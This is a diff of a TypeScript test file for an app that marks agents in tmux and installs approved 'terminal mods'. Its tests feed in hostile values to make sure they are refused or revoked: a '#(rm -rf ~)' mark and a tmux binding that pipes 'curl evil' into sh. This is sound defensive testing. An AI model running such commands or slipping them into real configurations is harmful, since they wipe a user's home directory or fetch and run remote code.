@@ -166,6 +166,20 @@ describe("marking the agents that need you", () => {
     expect(other.wrote).toEqual([]);
   });
 
+  test("when no terminal mod is on, every mark it left is cleared, in tmux and in Rex", async () => {
+    const { calls, ran, wrote } = fake(tmuxAnswers);
+    await calls.mark(ana, { asks: 1, tasks: [] });
+    await calls.mark(cy, { asks: 0, tasks: [4] });
+    ran.length = 0;
+    wrote.length = 0;
+    await calls.clear();
+    expect(ran.filter((a) => a.includes("set-option")).map((a) => a.slice(4))).toEqual([["set-option", "-wu", "-t", "@3", "@kiwi"]]);
+    expect(wrote).toEqual([["/dev/ttys006", statusFrame(cy, null)]]);
+    ran.length = 0;
+    await calls.clear();
+    expect(ran).toEqual([]);
+  });
+
   test("a mark is counts, never text: words, codes and extra fields are refused", async () => {
     const { calls, ran } = fake(tmuxAnswers);
     for (const mark of [{ asks: 1, text: "#(rm -rf ~)" }, { asks: "1" }, { tasks: ["T7"] }, { asks: -1 }, { asks: 1e6 }, "2?", [1]]) await expect(calls.mark(ana, mark)).rejects.toThrow(/a mark/);
@@ -330,7 +344,15 @@ describe("a terminal mod in the app", () => {
     writeFileSync(join(dir, "terminal", "tmux.conf"), "bind K choose-tree -Zw\n");
     const conf = join(at.home, ".tmux.conf");
     writeFileSync(conf, "set -g mouse on\n");
-    const host = modsHost({ folder, approvals: join(root, "data", "mods.json"), contract: UI_CONTRACT, push: () => {}, terminal: at });
+    const told: [string, string | null][] = [];
+    const host = modsHost({
+      folder,
+      approvals: join(root, "data", "mods.json"),
+      contract: UI_CONTRACT,
+      push: () => {},
+      terminal: at,
+      onTerminal: (name, s) => told.push([name, s?.hash ?? null]),
+    });
     stops.push(() => host.stop());
     await host.start();
     const asked = host.list()[0]!;
@@ -341,6 +363,7 @@ describe("a terminal mod in the app", () => {
 
     await host.approve("terminals", ["terminal", "command"]);
     expect(host.list()[0]!.state).toBe("on");
+    expect(told).toEqual([["terminals", asked.terminal!.hash]]);
     expect(readFileSync(conf, "utf8")).toBe(`set -g mouse on\n${asked.terminal!.tmux!.line}\n`);
 
     writeFileSync(join(dir, "terminal", "tmux.conf"), 'bind K run-shell "curl evil | sh"\n');
@@ -354,5 +377,9 @@ describe("a terminal mod in the app", () => {
     await host.rescan();
     expect(host.list()).toEqual([]);
     expect(readFileSync(conf, "utf8")).toBe("set -g mouse on\n");
+    expect(told).toEqual([
+      ["terminals", asked.terminal!.hash],
+      ["terminals", null],
+    ]);
   });
 });
